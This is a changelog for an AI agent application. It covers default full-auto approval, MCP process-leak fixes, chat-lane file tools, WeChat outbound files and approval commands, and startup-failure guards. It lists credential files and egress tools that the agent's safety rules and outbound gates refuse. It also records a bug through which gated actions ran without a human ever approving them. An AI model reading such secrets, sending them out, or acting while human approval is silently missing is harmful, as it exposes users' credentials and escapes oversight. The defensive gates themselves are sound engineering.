# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project aims at
[Semantic Versioning](https://semver.org/spec/v2.0.0.html) once it reaches 1.0.

## [Unreleased]

### Changed

- **Default approval mode is now `full-auto`.** Out of the box the agent no
  longer interrupts the user to write a file or to run a shell command; it
  starts the work immediately. The unconditional safety rules are unchanged and
  are consulted *before* the mode, so they still refuse: the app's own key store
  and credential files (`~/.ssh/id_rsa`, `.aws/credentials`, `.netrc`,
  `.kube/config`, `.kdbx`, …), any explicit `DENY` in the permission policy, and
  — in a tainted run — egress (`webfetch` / `curl` / …) and reads of a secrets
  file (`.env`, `secrets.json`). `KAIROS_APPROVAL_MODE` remains a process-wide
  *ceiling*: a stricter value still tightens every project, and a project may be
  stricter than the ceiling but never looser.

- **微信出站文件改以「本轮真正写出来的文件」为准，文本启发式降为兜底 fallback。**
  此前「发文件」只看模型回复里**是不是提到了**某个路径（启发式）——空谈也能命中、真产出
  反而可能漏。现在在微信入站处理里、调 agent **之前与之后**各对围墙根拍一次
  「路径 → (mtime, size)」快照，**新增或 (mtime/size) 变动的文件**（快照差集）作为**主
  候选**；`.git` / `node_modules` / `.venv` / `__pycache__` / `attachments`（入站附件）/
  `runs` / `.kairos-*` / `*.tmp` 等无关目录与文件的变动不计入（忽略名单集中成一个常量并
  注明理由）。快照有界（条目数 5000、墙钟 0.5s）且 best-effort，任何失败都只意味着「不发
  文件」，**绝不影响文本回复**。真信号与文本启发式候选**合并去重**（同一文件只发一次、
  顺序稳定），且过与之前**完全一致**的安全门（围墙 / `is_file` / 25 MiB / 最多 3 个 /
  名字黑名单 / 内容嗅探）。另加两条日志（候选 / 实发），便于日后区分「本轮没产出」与
  「产出了但发失败」。**范围：微信专用** —— 企微（`WeComBot.send_text`）与 IM 连接器出站
  队列都不走这条出站文件路，未改动它们。

### Fixed

- **MCP servers still leaked on the hot path.** The reload guard only covered the
  config-change path; the per-request mount check could still spawn a fresh set
  (`--mcp-serve` children were measured climbing 5 → 8 across identical request
  rounds). Mounting is now deferred while a mount is already in flight
  (`should_defer_start`), and every lifecycle decision is written to a greppable
  file under the instance's own data directory
  (`logs/mcp-lifecycle.log`: first mount, reload-on-config-change, a reload blocked
  by the guard, a failed close, and whether a request triggered a mount at all) —
  a windowed build has no console, so a file is the only signal an operator can
  read. Measured live afterwards: 13 MCP processes stable across 15 identical
  request rounds, zero new PIDs. The same pass fixed the extensions probe, which
  called the async `start_all()` without awaiting it and then closed with
  `asyncio.run(...)` from inside a running loop.

- **A reply from another conversation rendered into the thread on screen.** The
  backend's WebSocket fans every project's activity out to every connected client,
  and the web chat appended purely by message topic without ever comparing the
  project — so a reply produced by a conversation running elsewhere (for example
  the WeChat project) appeared inside the open web thread, and switching projects
  then snapshotted it into that thread. The activity handler now resolves each
  event's project (`metadata.project_id` first, else the sender's
  `<project>.lane` prefix) and drops provably-foreign events before any append,
  stream chunk, live-status update or loop badge — an event with no project signal
  at all is still let through, so the ordinary single-project flow is unchanged.

- **The model's private reasoning was handed to you as the answer.** The provider
  promoted the hidden reasoning channel into `content` whenever a turn produced no
  content of its own (`complete()` did `content = reasoning`; `stream()` yielded the
  reasoning buffer), so a reasoning model such as `deepseek-flash` — which spends
  its turn thinking and returns an empty `content` — appeared in the chat bubble as
  its own monologue ("…Let me build a Python script…"). `content` is now purely the
  content channel: when it is empty the provider leaves it empty, keeps the
  reasoning tail for the thinking line, sets `reply_from_reasoning` and logs a
  warning. The comment in `kairos/llm/base.py` ("it must never be merged into
  content, which is the answer and only the answer") is now actually true.

- **A request for a document produced a plan instead of a file.** With the
  monologue gone the general chat lane can be held to the work: a turn that returns
  no content and calls no tool, or a reply that only promises a plan/draft, gets one
  bounded corrective nudge and is re-asked — so the model actually calls
  `file_write`, the file lands in the workspace and comes back in `artifacts`. The
  lane prompt now states the deliverable rule outright (write the document into the
  workspace and hand back the path; do not paste it and do not stop at a plan),
  while keeping the original "a plain greeting writes nothing" behaviour.

- **MCP servers leaked processes while the app ran** (a real machine showed 36 live
  `--mcp-serve` children four minutes after launch). Two composed causes:
  `_create_agents` attached MCP with the per-role **worktree** root while
  `_mcp_config_changed` fingerprinted the **project** root, so a git project looked
  like "config changed" on every request and re-attached constantly; and the reload
  path was fire-and-forget, so each rapid trigger scheduled its own close-then-swap,
  all closing the same old registry and orphaning the ones in between. Attach now
  always fingerprints the project root, and a single-flight guard collapses any
  number of rapid triggers into one swap (a failed close keeps the old registry and
  spawns no second set).

- **A chat turn could be answered from another project's state.** The tool-result
  cache (`kairos/tools/cache.py`) is a process-wide singleton, and the agent loop
  behind `coder.chat()` and every `spawn_subagent` child never cleared it; it now
  clears at the start of each run. Chat history reads also drop a row whose own
  `metadata.project_id` contradicts the requested project, which catches a
  mis-persisting writer that the SQL scope alone cannot.

- **The chat lane never saw the conversation so far, so every turn felt like a
  brand-new agent.** `run_chat_reply` took a single `message` and built its
  prompt from the workspace files alone — no history parameter, and no caller
  passed any prior turn, so the model could not know what it had just said.
  The lane now loads the project's real chat history from SQLite (chat topics
  only, newest-first, capped at 20 turns / 4000 chars with the oldest dropped
  first, a single oversized turn clipped rather than dropped) and injects it
  into both model seams as a labelled `## Recent conversation` block that states
  it is background — *not* a new instruction — so a follow-up-looking past turn
  cannot be mistaken for the new command. History is project-scoped because the
  chat lane has no session id (`/chat/:sessionId` addresses the Coder loop, not
  this lane). With no history the prompt is byte-identical to before, the live
  turn is not duplicated, and one project's history can never leak into another's.

- **Streaming tool calls were silently dropped on the litellm provider.**
  `litellm_provider.stream()`'s comment claimed it collapsed the incremental
  tool-call deltas into a final sentinel, but there was no accumulator at all and
  the sentinel was emitted only when the *terminal* chunk itself carried
  `tool_calls` — which streaming providers never do. `_stream_complete` therefore
  never saw a tool call and the model's tool use vanished. Deltas are now folded
  by index (dict- or object-shaped, `id`/`name` first-wins, `arguments`
  concatenated from string fragments) and the sentinel is emitted whenever the
  accumulator is non-empty at end of stream; malformed chunks log instead of
  crashing. Text-only streams are byte-identical. The sibling providers
  (openai/anthropic/ollama/resilient) already accumulated correctly.

- **Harness memory notes were written and read by nobody, so a note recorded in
  the Continual Harness panel never reached the agent.** `memory_notes` lived in
  `<project_dir>/.kairos/harness/harness.json` and only the HTTP layer ever
  touched it; no prompt assembly read it back (the same "written but never read"
  family as the project-memory store). `assemble_coder_memory` now injects them
  through the channel that already carries the SQLite project notes — newest
  first, capped at 8 entries, deduped against the project notes, and labelled
  `## Harness Notes (self-recorded via the Continual Harness panel)`. The new
  reader is read-only by contract: it never creates `.kairos/harness/`, never
  raises, and logs a warning (never swallows silently) when the file is corrupt.

- **Live edits of `.kairos/mcp.yaml` were ignored after the process-leak fix.**
  Reusing the project's MCP registry (the leak fix) also meant a config edit no
  longer took effect until the project runtime was closed — previously it did,
  but only because every request rebuilt the registry, which is exactly what
  leaked child processes. A content fingerprint (sha256 of the user-editable
  config files, cached on `(path, mtime_ns, size)`) now decides: unchanged →
  reuse, so the registry `id()` is stable and no new child process is created;
  changed → **close-then-swap**, closing the old registry before constructing the
  new one. If `close_all` fails, the old registry is kept — never two live
  registries — an `attach_errors` trace is recorded and the fingerprint is not
  advanced, so the next attach retries.

- **Project memory was written and read from different files, so the agent
  never saw what was remembered in the UI.** The memory panel (and the
  `/remember` chat command) wrote to `<data_dir>/memory_kb.json`, while the
  agent read `<project_dir>/.kairos/memory_kb.json` — two stores that never
  met, so a memory the user saved was silently uncallable. All constructions now
  go through a single resolver (`kairos.memory_kb.resolve_storage_path` /
  `project_storage_path`): writes land in the per-project store the agent reads,
  and a project-less call falls back to the documented default with an explicit
  warning. There is no silent fallback and no silent `None` KB. Old stores
  (`<data_dir>/memory_kb.json`, `<data_dir>/memory/kb.json`) are read read-only
  when the canonical store does not exist yet — never migrated, moved or
  deleted. The memory panel now sends `project_id`. Guarded by
  `tests/test_memory_store_alignment.py`.

- **Read-only tools were mis-classified as needing approval in `SUGGEST` mode.**
  `kairos.approval.decide` only auto-allowed `READ_ONLY_TOOLS` in `EDIT`, so the
  default tier (and a strict gate) asked before reading a file the user had just
  handed the agent — contradicting the module's own comment ("silent in SUGGEST
  and EDIT modes"). Reads are now silent in both interactive tiers, while writes
  and process execution still ask there. The read-only set was also corrected to
  cover the tools that really read (`doc_read`, `xlsx_read`, `data_analyze`,
  `history_search`) and to drop names that were never dispatchable tools
  (`git_diff` / `git_log` / `git_show` / `list_skills` / `list_agents`).

- **Startup failures were recorded but unreadable, and one of them cried wolf
  every launch.** `get_startup_failures()` had no reader outside `api/app.py`,
  so nothing told the user which subsystems failed to assemble; and because
  `playwright` is the optional `browser` extra (`pyproject.toml`), a base or
  packaged build recorded `browser_manager` as a *failed* subsystem on every
  start — the kind of signal that trains a reader to ignore the list. The
  subsystem table now carries a third field, an optionality predicate: a
  subsystem that may legitimately be absent is recorded in the new
  `STARTUP_SKIPS` (`get_startup_skips()`) with the reason, and
  `STARTUP_FAILURES` stays a list where every entry means something is really
  wrong. Optionality can never launder a fault: when `playwright` *is*
  installed, a manager that still did not come up remains a failure. Both
  records are exposed on `GET /api/sentinel/status` (`startup_failures`,
  `startup_skips` — additive keys). The browser tool and the `/api/browser/...`
  routes now return "browser support is not included in this build (optional
  extra `browser`)" instead of a raw `ModuleNotFoundError`. Guarded by
  `tests/test_startup_registry.py`, including the nail that a real browser fault
  is never excused by optionality.

- **沙箱模式（coder git worktree）里生成的文件发不回去。** 出站文件的围墙根此前只取
  项目根（`work_dir or workspace`），而沙箱模式下 agent 的文件工具被围到 **coder 工作树**
  （`project.runtime.coder_worktree.path`），新产出的文件落在工作树里、**不在**项目根下 ⇒
  按项目根做的相对路径判定落空，于是什么都发不回来。现在工作区解析器同时给出「项目根 +
  coder 工作树」两个根（取路径照 `kairos.worktree.Worktree.path`，不猜属性名），候选在
  **任一**根内即为合格；围墙判定仍是既有的 `resolve_within_root`（**逐根各自判定**，不在
  任何根内的不发展为候选）。首次消息时工作树是在 dispatch 期间才创建、无可信基线，此时
  不启用差集，避免把工作树 checkout 出的既有文件误当成本轮产出。

- **`get_project` leaked MCP subprocesses and rebuilt the whole registry on
  every request.** Two defects combined: (1) `_attach_mcp` always built a
  brand-new `McpRegistry` (a full set of MCP subprocesses, ~100 MB each) and
  then *overwrote* `project.runtime.mcp_registry` without closing the previous
  one, so the old children were orphaned; (2) the lazy-retry guard in
  `get_project` treated a non-raising `_create_agents` as success and dropped
  its "only retry once" marker — even when the project was left without a
  `coder` — so the rebuild ran again on the very next request. A running
  instance spawned a new `--mcp-serve` child every few seconds and never
  reaped the old ones. `_attach_mcp` now reuses the registry a project already
  owns (by `runtime.mcp_registry` and by a process-level map keyed on project
  id, so a cache-miss rehydrate still finds it) and never constructs a second
  one; the retry guard, extracted to `_attach_agents_once`, keys on the
  *result* — a return that leaves `coder` unset stays in `_attach_failures`
  (once per process, not once per request), while a genuinely wired project
  clears the marker so a later transient failure can still retry. The
  rehydrate path routes through the same guard. Regression guard:
  `tests/test_mcp_registry_idempotence.py`.

### Added

- **The chat lane is now a real agent: it calls tools, produces files and hands
  them back to you.** The conversational lane used to be read-only by design
  (`read_only_tools()` built readers and nothing else), so "分析一下…给我 md 文档"
  could only answer that the workspace had no files. It now runs the same tool
  classes the Coder is wired with — `file_write`, `file_edit_replace`,
  `multi_edit`, `terminal`, `webfetch`, plus the readers — rooted at the project
  workspace, inside the same capability allowlist and red lines (the default
  full-auto dial and the credential/egress refusals are untouched). The lane has
  its own turn budget (`GENERAL_CHAT_MAX_TURNS = 12`, was 6) and clips each tool
  result, so a real task (read → write → run → answer) fits without blowing the
  context window.

  What a turn produced is decided by a before/after filesystem snapshot diff —
  never by the model's claim — reusing the WeChat lane's snapshot machinery, now
  extracted to `kairos/file_snapshot.py` (the WeChat lane re-exports it
  unchanged). The chat response gains an `artifacts` array (`path` / `name` /
  `size` / `mime`; always present, empty when nothing was produced), the same
  array is stored on the reply message's `metadata.artifacts` so it survives a
  refresh, and `GET /api/projects/{id}/artifacts/download?path=…` serves the file
  back (`inline` for text, so markdown previews in a tab; absolute paths, `..`
  traversal and symlink escapes are all refused — 400). The web chat renders each
  artifact as a card with its size, a download link and a preview toggle for
  text/markdown, in all 63 languages (the 7 new keys are honest English fallbacks
  outside zh/en: the configured translator key returns 401 and no translation was
  invented).

- **微信出站文件：一组「绝不自动外发」的判据（比上面那条特性本身更要紧）。** 触发规则是
  启发式，会把模型只是**提及**的文件也选中 ⇒ 不做闸的话，一句「你正在看的
  `data/settings.json`」就会把**带密钥的文件加密上传到第三方 CDN** —— 那不是体验问题，
  是凭据外泄。现在三道判据任一命中即拒：① 名字/后缀/目录形状（`.env*`、`settings.json`、
  `credentials*.json`、`id_rsa`/`id_ed25519`、`*.pem`/`*.key`/`*.p12`/`*.jks`、`*.db`/
  `*.sqlite*`、路径里的 `.git`/`.ssh`/`.gnupg`/`.aws`、以及主名含 `secret`/`credential`/
  `password`/`token`/`apikey`/`private`）② 内容是私钥（`-----BEGIN … PRIVATE KEY-----`）
  ③ **内容里出现凭据形状**（复用 `kairos.sentinel` 自己的脱敏规则：脱敏后与原文不同就拒）。
  正常交付物照旧发（`outputs/report.md` 之类不受影响）；被拒的文件只体现在「没发出去」，
  文本回复本来就写着路径。

- **微信（ClawBot / iLink）现在能把 agent 生成/引用的文件发给用户 —— 但它用的是
  「保守启发式」，不是可靠的产出信号。先把话说清楚**：本通道拿到的回复就是一个
  **完整字符串**（`kairos/skeleton/service.py:run_chat_reply` 返回 `Optional[str]`、
  `kairos/agents/agent_parts/chat.py` 的 `AgentChatMixin.chat(...) -> str` 亦然），
  路径上**没有任何「我产出了哪些文件」的字段**。所以触发规则只能取启发式：**扫描
  回复文本里出现的、位于该项目工作区内、且真实存在的文件路径**，最多 **3** 个、每个
  ≤ **25 MiB**；找不到就不发任何文件、只发文本（**不改变现有行为**）。**没有**实现
  「把所有附件都发回去」这类反人类的默认行为。

  - **上传链**（`kairos/weixin_ilink.py`，与入站下载/解密**互为镜像**）：读明文 →
    算 `rawfilemd5` / 密文长度（AES-128-ECB + PKCS7）→ 新生成 `filekey`/`aeskey` →
    `ilink/bot/getuploadurl` 取参数 → 用 `aeskey` 加密 → POST 到 CDN（响应头
    `x-encrypted-param`）→ 构造 `file_item`（type=4）。`media.aes_key` 写的是
    **base64(32 位十六进制串)**，正是入站 `parse_aes_key` 认的编码，两边可对扣。
  - **顺序**：**先发文件、再发文本**（用户先看到东西、再看说明）；长回复的分段投递
    照旧（条数上限不变），文件只是排在最前面。
  - **兼底与安全**：没配解析器 / 拿不到工作区根 / 取参数失败 / 加密或上传失败 /
    超限 / 路径在围墙外 —— **一律不发**，**绝不吞掉或重复发**那条文本回复（不另补
    「文件在哪」的说明，因为文本本身就写着路径）。围墙判定与只读文件工具同一套
    （`kairos.tools.base.resolve_within_root`）。`aeskey`/`filekey`/上传参数都是每次
    调用新生成的临时值，**不进日志、不进异常、不进测试快照**。
  - **隔离**：只作用于 `WeixinChannel.handle_message` 的回复路径。`send_text`（审批
    推送 / 测试 `/send`）不动；网页、IM、企微的出站**一字未改**；分段投递的参数与
    行为**未改**。新增一个可选的 `workspace_resolver` 注入点（`api/app.py` 接线、
    `api/routes/weixin.py:make_workspace_resolver`），**为 None 时完全不发文件**。
  - **字段出处**：出站字段形状照腾讯官方 MIT 许可插件
    `@tencent-weixin/openclaw-weixin@2.4.9` 的 TypeScript 源码推断（`cdn/upload.ts`/
    `cdn/aes-ecb.ts`/`cdn/cdn-url.ts`/`cdn/cdn-upload.ts`/`api/api.ts`/`api/types.ts`/
    `messaging/send.ts`），**只借接口事实、不搬其代码**（MIT 与本仓许可不同）。
  - **未经真机验证**：没有在真实微信上端到端跑过「发文件」；字段名/形状是照源码推断
    的，不是真响应样本。离线覆盖：`tests/test_weixin_media_outbound.py`（30 个用例：
    AES 往返与入站解密对扣 / 密钥编码镜像 / 文件项字段形状 / 超 25 MiB 不发 / 围墙外
    不发 / 拿不到上传参数或上传报错退纯文本且文本不丢不重 / 无文件时逐字不变 / 文件
    先于文本）。

- **微信（ClawBot / iLink）回复改成「分段渐进投递」—— 注意，它*不是* token 级流式。**
  这条通道此前把整条回复**一次性**发出去：回复有多长，用户就等多久、然后收到**一坨**。
  现在长回复会按自然边界切成几段、分几条消息先后发出（短回复仍是一条，**逐字不变**）。
  **先把话说清楚**：本通道拿到的回复就是一个**完整字符串**，不是 token 流 ——
  `kairos/skeleton/service.py:run_chat_reply` 返回 `Optional[str]`、
  `kairos/agents/agent_parts/chat.py` 的 `AgentChatMixin.chat(...) -> str` 也返回
  字符串。所以这里做的是**「最终文本分段落渐进投递」**，**不是**「逐字吐出」：用户
  能看到**分段到达**，**看不到**打字机逐字。真实感上限如此，代码与文档均如实标注。

  - **条数**：回复短（≤ **360** 字符，一个微信气泡舒适显示约 6 行的量）→ **只发
    一条**；回复长 → 最多 **N=3** 条（env `KAIROS_WEIXIN_STREAM_CHUNKS` 可调，另设
    **硬上限 6**）；置 `1` 即**完全关闭**分段。切法与内容**只增不改**短回复路径。
  - **逐字不重复不丢**：所有分段拼起来 `"".join(chunks)` **逐字等于**最终回复；不会
    最后再补一条完整版。
  - **只在自然边界切**：空行（段落）/ 换行 / 句末（`。！？；` 与「后接空白」的英文
    `.!?;`）；**不切进 ```` ``` ```` 代码块内部**、**不在字中间切**（`3.14` /
    `file.py` 不会被拦腰截断）；找不到合适边界就**宁可不拆**（保持单条）。
  - **中途失败不丢尾**：某一段发送失败时，把**剩下的**拼成一条整体**重投 ≥1 次**
    （复用同一 `client_id` 供服务端去重）；重投仍失败则返回 `ok=False` 且
    `failed_at` **显式指明边界**并记一条 ERROR —— **绝不静默截断**。
  - **隔离**：只作用于 `WeixinChannel.handle_message` 的回复路径。审批推送 / 测试
    `/send` 走的 `send_text` 仍是**单条**；网页、IM、企微（`api/routes/wecom.py`）
    的出站**一字未改**。
  - **未做**：没有把 Coder 内部真实的 token 级流式（`agents/.../llm.py` 的
    `_stream_complete` 把 delta 发布成消息总线 `stream.chunk` 事件）接到微信 —— 那是
    **推送式事件**而非可 `await` 的生成器，且相关文件属红线。**未经真机验证**：没有
    在真实微信上实测分段到达的观感 / 条数体验。实现：`kairos/weixin_ilink.py`
    （`split_reply_for_delivery` / `WeixinChannel.deliver_reply` / `ReplyDelivery`）；
    离线覆盖：`tests/test_weixin_streaming.py`（16 个用例）。

- **通用车道（`kairos.skeleton`）现在带只读文件工具，能真的读用户附件。**
  通用车道此前一个工具都没有（`kairos/skeleton/service.py` 的 worker 只收
  `generate(prompt) -> str`），所以把附件折成 `[附件]` 提示词给它时它**读不了**
  文件——这正是微信通道此前要「带媒体强制走 Coder」的原因。现在通用车道在回答
  前可以调用一组**只读**工具（`file_read` / `doc_read` / `xlsx_read` /
  `data_analyze` / `grep` / `find`），与 Coder/Reviewer 用的是**同一批**真工具、
  同一套项目目录围墙（`fence_path` / `_resolve_safe`，`is_full_access()` 放行）
  与同一道 zip 防护（`kairos/tools/zipguard.py`）。工具集**绝不含**写文件 / 执行
  进程 / 网络类工具：新增的 `kairos/skeleton/read_tools.py` 既只构造只读工具，
  又在执行前对调用再做一次「能力 ⊆ `READ_FILE`」的判定。只读能力按
  `requires_approval` 的阶梯本就不弹问，所以闲聊车道不会因为读文件而弹出审批。

- **微信（ClawBot / iLink）通道接上了「审批 / 停止」，这条通道不再只有文本层。**
  此前 agent 需要人批准一个动作时，闸门（`kairos/sentinel.py` 的
  `authorize_async`）问出的问题只有网页端看得见，微信里既看不到、也没法回答 ——
  等于默默卡住或被拒。现在：

  - **把问题推到微信**：属于某个微信会话的审批问题，脱敏后作为**一条文本**推到
    那个会话（复用现成的出站能力，不新造通道）。正文只有动作名 + 关键参数的人类
    可读描述，复用 `kairos/sentinel.redact` 脱敏并额外遮掉连接串里的
    `user:password@`，单字段截断到 200 字符 —— 不倾倒大块命令，不带出
    密钥 / 令牌 / 连接串。
  - **把回答接回现有机制**：会话里的 `/approve`、`/deny`、`/stop`（**大小写不
    敏感**，可带参数，`/approve 1` 用于多问时选号）分别接到
    `ApprovalChannel.resolve`（与网页端 `POST /api/approvals/{id}` **同一个方法**）
    和 `orchestrator.stop_loop` + `skeleton.runner.stop_skeleton_run`（与
    `POST /{id}/stop` **同一对调用**）。**没有另建一套审批或停止**；`/help` 也补上
    了这三条。
  - **超时自动拒绝**：等待默认 **300 秒**（`KAIROS_WEIXIN_APPROVAL_TIMEOUT` 秒，
    可小数；非法值退回默认），到点按**拒绝**结清并回一条可读文本告知。该时限只
    作用于微信发起的问题 —— 新增的 `ApprovalChannel.set_timeout_resolver` 是
    **默认关闭**的可选钩子，网页端的等待时间与行为不变。
  - **全程 fail-closed**：推不出去、会话对不上、本会话已有未决问题、`/approve`
    参数解析不了，一律**拒绝**，绝无自动批准路径。每个入站会话同时只允许一个
    未决问题；入站消息改成**每条一个任务**处理，因此一个会话停在等审批上不会阻塞
    同一账号的其它会话（否则用来回答 `/approve` 的那条消息会被堵在同一个轮询
    协程后面，审批永远收不到回答）。

  **未经真机验证**：这条链路**没有在真实微信上端到端跑过**（需要真机扫码 +
  真实的 `getupdates` 消息流，而扫码之后的收发链路本身也还没上真机）。离线覆盖见
  `tests/test_weixin_approvals.py`（29→31 个用例，用**真实的**消息总线与审批通道
  驱动，只把微信出站换成假的）；细节与「没有做的事」见 `docs/WEIXIN_ILINK.md` 第七节。

  **还有一个先于本轮存在的前置缺陷**（本轮**没有**修，因为修它会改变网页端审批
  行为）：`api/app.py` 的 lifespan 装审批通道时调用了本文件里不存在的 `_orch()`
  （`from api.deps import orchestrator` 才是实例名），于是
  `approvals.set_channel(...)` 从未生效 —— 进程里没有审批通道，闸门就不会把 ASK
  变成问题。因此本桥在真实进程里目前是**空转**（照常接线、fail-closed），而不是
  不安全。把 `api/app.py` 里那 6 处 `_orch()` 调用改成
  `from api.routes.projects import _orch`（该 shim 按调用时刻解析
  `deps.orchestrator`）即可让整条链路生效（代价是网页端 ASK 从「按策略放行」变为
  「弹问题、120 秒不答即拒绝」），该决定留给上层。lifespan 现在会在缺通道时打一条
  warning 说明。

### Changed

- **默认车道从「循环」改成「通用车道」——这是一条用户可见的默认行为变更。**
  一条没有编码意图、也没有长任务信号的普通消息，此前一律交给 Coder（走
  Coder/Reviewer 循环），现在改为在通用车道（`kairos.skeleton`）上回答：
  同一条会话记录、同样的回复字段，只是不再为一个「你好」拉起整个循环。
  带编码意图、显式 `kind`、plan / 长任务的消息仍然走原来的循环。设
  `KAIROS_ROUTE_DEFAULT=loop` 可逐个进程退回旧默认（不设、空值、`skeleton`
  或任意无法识别的值都保持新默认）。

  这一轮把落到各入口上的路由接线补齐，新增/覆盖了四个口子：

  - **路由覆盖**：Web `/chat`、`/start`、IM、微信、企业微信五个入口都先过
    `route_task` 判定车道。其中企业微信自建应用入口（`api/routes/wecom.py`）
    此前仍在绕过路由、把每条成员消息直连 Coder，现与 Web/IM/微信同构：闲聊
    走通用车道，通用车道无模型 / 抛异常 / 返回空时回退 Coder——纯文本消息仍
    能拿到回复，不会变成什么都不回。
  - **媒体收件**：微信入站的图片 / 文件 / 视频先落盘到项目附件目录，再按 Web
    会话同一套折进提示词交给 agent。**带媒体的消息与纯文本走同一条路由**
    （判定只看用户文本）——通用车道现在带只读文件工具，能真的读到附件块，
    所以不再需要为「带媒体」绕回 Coder；通用车道无模型 / 抛异常 / 返回空时
    照旧回退 Coder，消息仍能拿到回复。
  - **zip 防护**：`kairos/tools/zipguard.py` 在解压前只读 zip 中央目录，按声明
    尺寸拒绝爆炸包；`xlsx_read` / `doc_read` 打开表格与文档前统一过这道闸。
  - **源码级 CI 守卫**：`tests/test_chat_entrances_route.py` 枚举仓库里所有
    「把用户消息交给 coder」的调用点，任何未过路由、又不在带理由白名单里的新
    入口都会让测试失败并指名 `文件:行`。

### Added

- **「启动装配空转」升级成结构性防线**（不再靠事后手写守卫追）。病根回顾：`api/app.py` 的
  lifespan 曾调 `_orch()`，而该名字在本文件**既不定义也不导入** ⇒ `NameError` 被外层
  `except Exception` 吞成一行日志 ⇒ 审批通道 / 长任务登记表 / 守护进程**从未启动**；而
  `kairos/sentinel.py:672-674` 对「无通道」是 `return ruling`（放行）⇒ **所有 ASK 档动作
  从没问过人就执行了**。手写一条守卫只盖住那一个名字，追不上这一类 ⇒ 三道一起上：

  1. **未定义名静态守卫**（`tests/test_startup_wiring_guard.py`）—— 只用标准库
     `ast` + `symtable`，**不依赖 ruff**（F821 语义：被引用但既非局部/参数/导入/自由变量、
     也不是模块绑定或内置名 ⇒ 报 `文件:行: Undefined name 'xxx'`）。
     **红证用的是真实历史而不是我编的错**：`git show 57221b4^:api/app.py`（修复前的真身）
     喂给守卫 ⇒
     ```
     api/app.py:115: Undefined name '_orch'
     ```
  2. **装配失败不许静默**（`api/app.py`）—— `STARTUP_FAILURES` +
     `_record_startup_failure(name, exc[, phase])`：lifespan 里**每一处** `except`
     （装配段与关停段共 25 处）都登记，同时保留原有日志。对外读取入口
     `api.app.get_startup_failures()`，并镜像到 `app.state.startup_failures`（每条含
     `subsystem` / `phase`(`startup`|`shutdown`|`probe`) / `error`）。测试三连：正常跑 ⇒
     登记表**为空**；故意让 browser manager 起不来 ⇒ 登记表**指名 `browser_manager`** 且其余
     子系统照旧起来；另有源码级守卫拦「`except Exception` 没有登记」。⇒ 「抛了却被吞成一行
     日志」这件事从此**有结构化痕迹**。
  3. **显式子系统注册表**（`api/app.py` 的 `_STARTUP_SUBSYSTEMS`，9 项 `(name, probe)`：
     approvals / long_running_registry / autonomous_worker / daemon_supervisor /
     browser_manager / feishu / wecom / im_store / weixin_ilink）—— 测试**遍历注册表**逐个
     断言「现在真的活着」（不再写死三个名字）；源码级 `audit_startup_calls` 拦「装配区里有
     未注册的启动调用」，白名单条目**必须带理由、过期会报错**。⇒ 以后往里加子系统，
     **忘了注册就会被测试拦住**。

  三道合起来正好盖完三种成因 —— ①名字根本不存在 ②存在但抛了被吞 ③新加的没人测。

- **新守卫上线第一分钟就抓出 5 处同类存量**（同一个 `symtable` 语义扫 `api/` + `kairos/`）：
  `api/routes/agents.py:55` `AgentTask` · `api/routes/cost.py:230/251` `_get_log_path` ·
  `api/routes/p2_features.py:91` `_orch` · `api/routes/projects.py:1339` `orchestrator`。
  **这就是「手写守卫追不上」的实证**：光修 `api/app.py` 那一处，另有 5 处照样活着在吞异常。
  （`kairos/perf.py:168` 的 `field` 是 `... if False else None` 死分支里的假调用，无害。）

### Fixed

- **自主任务链从来没成功过：把 `Message` 当 dict 用，异常被自己吞掉。**
  `MessageBus.recent()` 返回的是 **`Message` 对象**列表（`kairos/core/message_bus.py:16-38`，
  dataclass，**没有 `.get`、也不可下标**），而 `kairos/autonomous_worker.py` 的
  `_fetch_requirement` 写的是 `msg.get("topic")` ⇒ 每次 `AttributeError` ⇒ 被同函数的
  `except Exception: return None` 吞掉 ⇒ **永远取不到需求文本** ⇒ 任务永远
  `failed: "could not fetch requirement from bus"`。跟发布那头无关（发布一直是成功的），
  所以只看「发布成不成功」永远查不出来。修：按属性读、并容忍 dict；`except` 改成
  `logger.warning`。**活体验证**：发布一条 `autonomous.submitted` ⇒ `_fetch_requirement`
  返回 `'REQ-TEXT-42'`（修前是 `AttributeError`）。

- **同一次全仓排查（`recent()`/`get_history()` 的消费方逐个过）又抓出一处三重 bug**：
  `kairos/cli.py` 的 `exec` 读计划那里 —— ① `get_history` 根本没有 `topic_filter` 形参
  （应是 `topic`）② 它是**同步**方法，却被 `await` ③ 返回 `Message` 对象，却按 dict 取
  （`msgs[-1].get(...)`）—— 三条全被 `except Exception: pass` 吞掉 ⇒ **`plan_text` 永远是空**。
  修好后同样给测试 stub 正名：`tests/test_cli.py` 的 `fake_get_history` 把这三处错**原样写进了
  测试**（`async`、`topic_filter`、返回 dict）⇒ 生产代码一直坏、测试一直绿，是
  **「测试把 bug 固化成契约」**的典型；现在 stub 按真签名（同步、`topic`、返回 `Message`）。

- **`POST /api/agents/task` 永远 500**：它调 `orchestrator.assign_task(...)`，而全仓
  **没有任何 `def assign_task`**（自首个提交起就是幻影方法）。前端**无人调用**它
  （`grep agents/task|assignTask web/src/` 零命中，UI 走 `/projects/{id}/chat`）⇒ 结论是
  「实现它」而不是「删掉它」：改成仓库里各处都在用的真实机制
  `project.coder.run(task)` / `project.reviewer.run(task)`（未知角色 404、未装配 503）。
  **活体验证**：`/task` → **HTTP 200** 且一路走到真 agent 调 LLM（只因测试环境没配 key
  才 `status: failed`）。同文件另发现 `POST /api/agents/chat` 调同样不存在的
  `orchestrator.chat_with_agent`，一并改成 `agent.chat(message)`。

- **13 条「围着有副作用的调用、却把失败静默吞掉」的处理器全部改成有痕迹**（保留 best-effort
  语义不变、不新增任何用户可见错误；每条的日志级别按严重度逐条给理由）：

  | 位置 | 被吞的调用 | 级别 |
  |---|---|---|
  | `api/routes/websocket.py` `collaboration_ws` | `send_json` | `debug`（客户端断开会话是常态；只服务端记，不往死 socket 写） |
  | `kairos/cost.py` `litellm_cost_callback` | `is_recording` | `debug`（best-effort 的 span tag） |
  | `kairos/daemon.py` `DaemonSupervisor.start` | `write_text` | `warning`（daemon.json 身份文件"本该写成功"） |
  | `kairos/daemon.py` `DaemonSupervisor._heartbeat` | `publish` | `warning`（心跳是存活证明） |
  | `kairos/observability.py` `_OtelSpanAdapter.record_exception` | `record_exception` | `debug`（**防递归**：无参无格式化无 exc_info） |
  | `kairos/weixin_ilink.py` `WeixinChannel.stop_account` | `notify_stop` | `warning`（远端停机通知"本该发出"） |
